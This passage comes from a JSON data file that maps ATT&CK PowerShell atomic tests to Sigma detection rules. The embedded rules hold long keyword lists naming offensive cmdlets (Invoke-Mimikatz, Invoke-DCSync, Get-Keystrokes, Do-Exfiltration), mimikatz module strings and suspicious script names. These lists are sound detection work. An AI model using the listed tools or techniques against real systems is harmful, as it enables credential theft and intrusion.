'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "HackTool - Mimikatz Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "a538de64-1c74-46ed-aa60-b995ed302598",
                "atomic_attack_name": "PowerShell Command Execution",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Execution of Powershell with Base64",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_encode.yml",
                        "remote_content": "title: Suspicious Execution of Powershell with Base64\nid: fb843269-508c-4b76-8b8d-88679db22ce7\nstatus: test\ndescription: Commandline to launch powershell with a base64 payload\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets\n    - https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/\n    - https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/\nauthor: frack113\ndate: 2022-01-02\nmodified: 2023-01-05\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - \\powershell.exe\n            - \\pwsh.exe\n        CommandLine|contains:\n            - ' -e '\n            - ' -en '\n            - ' -enc '\n            - ' -enco'\n            - ' -ec '\n    filter_encoding:\n        CommandLine|contains: ' -Encoding '\n    filter_azure:\n        ParentImage|contains:\n            - 'C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\'\n            - '\\gc_worker.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "af1800cf-9f9d-4fd1-a709-14b1e6de020d",
                "atomic_attack_name": "Mimikatz - Cradlecraft PsSendKeys",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "HackTool - Mimikatz Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious Program Names",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_progname.yml",
                        "remote_content": "title: Suspicious Program Names\nid: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\nstatus: test\ndescription: Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-11\nmodified: 2023-03-22\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        - Image|contains:\n              - '\\CVE-202' # Update this when we reach the year 2100\n              - '\\CVE202' # Update this when we reach the year 2100\n        - Image|endswith:\n              - '\\poc.exe'\n              - '\\artifact.exe'\n              - '\\artifact64.exe'\n              - '\\artifact_protected.exe'\n              - '\\artifact32.exe'\n              - '\\artifact32big.exe'\n              - 'obfuscated.exe'\n              - 'obfusc.exe'\n              - '\\meterpreter'\n    selection_commandline:\n        CommandLine|contains:\n            - 'inject.ps1'\n            - 'Invoke-CVE'\n            - 'pupy.ps1'\n            - 'payload.ps1'\n            - 'beacon.ps1'\n            - 'PowerView.ps1'\n            - 'bypass.ps1'\n            - 'obfuscated.ps1'\n            - 'obfusc.ps1'\n            - 'obfus.ps1'\n            - 'obfs.ps1'\n            - 'evil.ps1'\n            - 'MiniDogz.ps1'\n            - '_enc.ps1'\n            - '\\shell.ps1'\n            - '\\rshell.ps1'\n            - 'revshell.ps1'\n            - '\\av.ps1'\n            - '\\av_test.ps1'\n            - 'adrecon.ps1'\n            - 'mimikatz.ps1'\n            - '\\PowerUp_'\n            - 'powerup.ps1'\n            - '\\Temp\\a.ps1'\n            - '\\Temp\\p.ps1'\n            - '\\Temp\\1.ps1'\n            - 'Hound.ps1'\n            - 'encode.ps1'\n            - 'powercat.ps1'\n    condition: 1 of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate tools that accidentally match on the searched patterns\nlevel: high\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "a136cde0-61ad-4a61-9b82-8dc490e60dd2",
                    "b7155193-8a81-4d8f-805d-88de864ca50c",
                    "a5a30a6e-75ca-4233-8b8c-42e0f2037d3b",
                    "175997c5-803c-4b08-8bb0-70b099f47595",
                    "dcd74b95-3f36-4ed9-9598-0490951643aa",
                    "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
                    "30a8cb77-8eb3-4cfb-8e79-ad457c5a4592",
                    "fe6e002f-f244-4278-9263-20e4b593827f",
                    "78aa1347-1517-4454-9982-b338d6df8343",
                    "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
                    "3711eee4-a808-4849-8a14-faf733da3612",
                    "afd3df04-948d-46f6-ae44-25966c44b97f",
                    "14bcba49-a428-42d9-b943-e2ce0f0f7ae6",
                    "02773bed-83bf-469f-b7ff-e676e7d78bab",
                    "e0a41412-c69a-446f-8e6e-0e6d7483dad7",
                    "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                    "403c2cc0-7f6b-4925-9423-bfa573bed7eb",
                    "c5c00f49-b3f9-45a6-997e-cfdecc6e1967",
                    "ebdf49d8-b89c-46c9-8fdf-2c308406f6bd",
                    "1cfac73c-be78-4f9a-9b08-5bde0c3953ab",
                    "d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18",
                    "1f21ec3f-810d-4b0e-8045-322202e22b4b",
                    "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
                    "cd0f7229-d16f-42de-8fe3-fba365fbcb3a",
                    "a746c9b8-a2fb-4ee5-a428-92bee9e99060",
                    "0152550d-3a26-4efd-9f0e-54a0b28ae2f3",
                    "6c6c6282-7671-4fe9-a0ce-a2dcebdc342b",
                    "80b708f3-d034-40e4-a6c8-d23b7a7db3d1",
                    "8c7090c3-e0a0-4944-bd08-08c3a0cecf79",
                    "092bc4b9-3d1d-43b4-a6b4-8c8acd83522f",
                    "7034cbbb-cc55-4dc2-8dad-36c0b942e8f1",
                    "ad1f4bb9-8dfb-4765-adb6-2a7cfb6c0f94",
                    "64e8e417-c19a-475a-8d19-98ea705394cc",
                    "ca8b77a9-d499-4095-b793-5d5f330d450e",
                    "e54f5149-6ba3-49cf-b153-070d24679126",
                    "f3c89218-8c3d-4ba9-9974-f1d8e6a1b4a6",
                    "f772cee9-b7c2-4cb2-8f07-49870adc02e0",
                    "de41232e-12e8-49fa-86bc-c05c7e722df9",
                    "f62176f3-8128-4faa-bf6c-83261322e5eb",
                    "eeb2e3dc-c1f4-40dd-9bd5-149ee465ad50",
                    "779c8c12-0eb1-11eb-adc1-0242ac120002",
                    "d7bcd677-645d-4691-a8d4-7a5602b780d1",
                    "3ceb2083-a27f-449a-be33-14ec1b7cc973",
                    "bb780e0c-16cf-4383-8383-1e5471db6cf9",
                    "c72aca44-8d52-45ad-8f81-f96c4d3c755e",
                    "8c521530-5169-495d-a199-0a3a881ad24e",
                    "db92dd33-a3ad-49cf-8c2c-608c3e30ace0",
                    "20e5497e-331c-4cd5-8d36-935f6e2a9a07",
                    "970a3432-3237-47ad-bcca-7d8cbb217736",
                    "8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090",
                    "d7326048-328b-4d5e-98af-86e84b17c765",
                    "9c0295ce-d60d-40bd-bd74-84673b7592b1",
                    "a62298a3-1fe0-422f-9a68-ffbcbc5a123d",
                    "25676e10-2121-446e-80a4-71ff8506af47",
                    "b2790e3f-e111-4755-b28f-ff902feabb17",
                    "f26c6093-6f14-4b12-800f-0fcb46f5ffd0",
                    "9b8d9203-4e0f-4cd9-bb06-4cc4ea6d0e9a",
                    "e312efd0-35a1-407f-8439-b8d434b438a6",
                    "27aec9c9-dbb0-4939-8422-1742242471d0",
                    "2f211361-7dce-442d-b78a-c04039677378",
                    "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
                    "cdf05894-89e7-4ead-b2b0-0a5f97a90f2f",
                    "dcf2db1f-f091-425b-a821-c05875b8925a",
                    "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6",
                    "b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5",
                    "fb843269-508c-4b76-8b8d-88679db22ce7",
                    "4bf943c6-5146-4273-98dd-e958fd1e3abf",
                    "e6cb92b4-b470-4eb8-8a9d-d63e8583aae0",
                    "058f4380-962d-40a5-afce-50207d36d7e2",
                    "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
                    "c31364f7-8be6-4b77-8483-dd2b5a7b69a3",
                    "636fd943-5631-4cc9-890a-4f400563533c",
                    "994cac2b-92c2-44bf-8853-14f6ca39fbda",
                    "a0edd39f-a0c6-4c17-8141-261f958e8d8f",
                    "99138053-ae5d-4bcf-b2f8-0954edb204bc",
                    "ac175779-025a-4f12-98b0-acdaeb77ea85",
                    "e32d4572-9826-4738-b651-95fa63747e8a",
                    "8ca7004b-e620-4ecb-870e-86129b5b8e75",
                    "59e938ff-0d6d-4dc3-b13f-36cc28734d4e",
                    "cc08d590-8b90-413a-aff6-31d1a99678d7",
                    "0c718a5e-4284-4fb9-b4d9-b9a50b3a1974",
                    "88f680b8-070e-402c-ae11-d2914f2257f1",
                    "34493f6d-9441-45df-9cb4-4de473709081",
                    "3d304fda-78aa-43ed-975c-d740798a49c1",
                    "f7385ee2-0e0c-11eb-adc1-0242ac120002",
                    "4edf51e1-cb83-4e1a-bc39-800e396068e3",
                    "ed965133-513f-41d9-a441-e38076a0798f",
                    "13acf386-b8c6-4fe0-9a6e-c4756b974698",
                    "6bfb8fa7-b2e7-4f6c-8d9d-824e5d06ea9e",
                    "f241cf1b-3a6b-4e1a-b4f9-133c00dd95ca",
                    "36c5146c-d127-4f85-8e21-01bf62355d5a",
                    "a6d67db4-6220-436d-8afc-f3842fe05d43",
                    "18988e1b-9087-4f8a-82fe-0414dce49878",
                    "a16980c2-0c56-4de0-9a79-17971979efdd",
                    "e9f55347-2928-4c06-88e5-1a7f8169942e",
                    "734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8",
                    "402e1e1d-ad59-47b6-bf80-1ee44985b3a7",
                    "41025fd7-0466-4650-a813-574aaacbe7f4",
                    "754ed792-634f-40ae-b3bc-e0448d33f695",
                    "033fe7d6-66d1-4240-ac6b-28908009c71f",
                    "1ab3c5ed-5baf-417b-bb6b-78ca33f6c3df",
                    "f331aa1f-8c53-4fc3-b083-cc159bc971cb",
                    "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                    "30e92f50-bb5a-4884-98b5-d20aa80f3d7a",
                    "bf72941a-cba0-41ea-b18c-9aca3925690d",
                    "56c217c3-2de2-479b-990f-5c109ba8458f",
                    "b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c",
                    "e1561947-b4e3-4a74-9bdd-83baed21bdb5",
                    "1a0a2ff1-611b-4dac-8216-8a7b47c618a6",
                    "812837bb-b17f-45e9-8bd0-0ec35d2e3bd6",
                    "401e5d00-b944-11ea-8f9a-00163ecd60ae",
                    "edc2f8ae-2412-4dfd-b9d5-0c57727e70be",
                    "f0507c0f-a3a2-40f5-acc6-7f543c334993",
                    "03d83090-8cba-44a0-b02f-0b756a050306",
                    "9c14c9fa-1a63-4a64-8e57-d19280559490",
                    "095c4227-2a9e-45da-9268-cec186be53b1",
                    "c70e019b-1479-4b65-b0cc-cd0c6093a599",
                    "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                    "7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4",
                    "9e2e51c5-c699-4794-ba5a-29f5da40ac0c",
                    "d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6",
                    "fce5f582-cc00-41e1-941a-c6fabf0fdb8c",
                    "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
